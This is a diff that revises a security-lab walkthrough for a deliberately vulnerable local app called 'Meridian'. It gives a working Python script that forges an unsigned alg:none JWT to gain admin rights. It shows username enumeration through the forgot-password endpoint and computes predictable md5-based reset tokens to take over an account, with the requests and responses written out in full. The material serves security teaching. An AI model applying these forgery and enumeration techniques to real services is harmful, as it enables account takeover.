@@ -28,61 +28,71 @@ Content-Type: application/x-www-form-urlencoded
 
 username=jdoe&password=Client1234!
 ```
-Paste the token into Burp **Decoder → Base64/URL decode**. A JWT is
-`header.payload.signature`. You'll see:
-- **Header**: `{"alg":"HS256","typ":"JWT"}` (the algorithm is named by the client-supplied header).
-- **Payload**: the claims, e.g. `{"sub":"jdoe","role":"customer","exp":...}`.
+Send this in **Repeater** first; the response returns `{"token": "<jwt>"}`. Paste
+that JWT into Burp **Decoder** and Base64-decode the first two segments (split on
+`.`). Verified against the running Meridian:
+- **Header**: `{"alg":"HS256","typ":"JWT"}` — signed with HMAC-SHA256; `alg` is attacker-controllable.
+- **Payload**: `{"user":"jdoe","is_staff":false,"exp":1794918769}` — note the real claim names are **`user`** and **`is_staff`**, not `sub`/`role`.
 
 ### 2 & 3. Forge an `alg:none` token and use it
 `alg:none` means "unsigned": the signature segment is **empty**. Build it yourself
 (base64url, no padding, no signature):
 
 ```python
-# forge_jwt.py  — run: python3 -I forge_jwt.py
-import base64, json
-def b64(d): return base64.urlsafe_b64encode(d).rstrip(b"=")
-header  = {"alg": "none", "typ": "JWT"}
-payload = {"sub": "admin", "role": "admin", "username": "admin"}  # name yourself admin
+# forge_jwt.py  — run in a TERMINAL: python3 -I forge_jwt.py  (NOT pasted into Burp)
+import base64, json, time
+b64 = lambda d: base64.urlsafe_b64encode(d).rstrip(b"=")   # base64url, no padding
 seg = lambda o: b64(json.dumps(o, separators=(",", ":")).encode())
-token = seg(header) + b"." + seg(payload) + b"."   # trailing dot, empty signature
-print(token.decode())
+header  = {"alg": "none", "typ": "JWT"}
+payload = {"user": "admin", "is_staff": True, "exp": int(time.time()) + 365*24*3600}
+print((seg(header) + b"." + seg(payload) + b".").decode())   # trailing dot = empty signature
 ```
-Send it:
+The script *prints a token*. Put **that string** (not the script) into the request
+header in Repeater — `Host` and `Authorization` must each be on their own line:
 ```
-GET /api/whoami/
+GET /api/whoami/ HTTP/1.1
+Host: 127.0.0.1:5001
 Authorization: Bearer <token-from-script>
 ```
-**Success = the response names you as `admin`** though you never had the key.
+**Success = `200 OK` with `{"user": "admin", "is_staff": true}`** though you never
+had the signing key. (Verified against the running Meridian.)
 📸 *Screenshot: the forged `alg:none` token accepted as admin (step 3).*
 
 ### 4. Username enumeration
+`POST /auth/forgot/` answers differently for real vs fake accounts (verified):
 ```
-POST /auth/forgot/     username=jdoe      → one response
-POST /auth/forgot/     username=zzzznope  → a *different* response
+username=jdoe     → 200  {"detail":"A reset token has been generated.","username":"jdoe","reset_token":"e66c883e"}
+username=zzznope  → 404  {"detail":"No account found for zzznope."}
 ```
-The difference (wording, status, or timing) tells existence apart. Feed a list to
-**Intruder** (`jdoe, rmasri, tokafor, admin, lina, …`), sort by the distinguishing
-field, and the real accounts are the ones with the "exists" response.
+The oracle is the **status code** (200 vs 404) and the message — and worse, a real
+hit even hands you the reset token. In **Intruder**, put the payload position on the
+`username` value, run your list (`jdoe, rmasri, tokafor, admin` + invented names),
+and sort by **Status**: the **200s are the real accounts**. (jdoe, rmasri, tokafor,
+admin all exist; invented names 404.)
 📸 *Screenshot: the two different answers (step 4).*
 
 ### 5. Compute the reset token
-The token is "8 hex chars, same every time for a user" → it's a **truncated hash of
-the username + a fixed word from the reset flow**. Try the obvious combinations:
+The 8-hex token is **`md5(username + "reset")`, first 8 chars** — deterministic and
+computable offline, confirmed on four accounts:
+```
+jdoe   → e66c883e = md5("jdoereset")[:8]
+admin  → 2e517dd9 = md5("adminreset")[:8]
+rmasri → b458ae75 = md5("rmasrireset")[:8]
+```
 ```python
-# reset_token.py — run: python3 -I reset_token.py jdoe
-import hashlib, sys
-u = sys.argv[1]
-for word in ("reset", "forgot", "password", "meridian"):
-    for algo in ("md5", "sha1", "sha256"):
-        h = hashlib.new(algo, (u + word).encode()).hexdigest()[:8]
-        print(f"{algo}({u}+{word})[:8] = {h}")
+import hashlib
+print(hashlib.md5(b"jdoereset").hexdigest()[:8])   # -> e66c883e
 ```
-Request a real token for two users, match it against this table to learn the
-`algo`/`word`, then compute jdoe's and use it:
+So you never need to ask the server. Reset jdoe with the computed token:
 ```
-POST /auth/reset/     username=jdoe&token=<computed>&new_password=Pwned1234!
+POST /auth/reset/ HTTP/1.1
+Host: 127.0.0.1:5001
+Content-Type: application/x-www-form-urlencoded
+
+username=jdoe&token=e66c883e&new_password=Pwned1234!
 ```
-Sign in as jdoe, then **reset it back to `Client1234!`**.
+→ `200 {"detail":"password reset","username":"jdoe"}`. Sign in as jdoe, then **reset
+it back to `Client1234!`** (same request with `new_password=Client1234!`).
 📸 *Screenshot: a password reset with a computed token (step 5).*
 
 ### Fix Part 1 (what a correct Meridian would do)
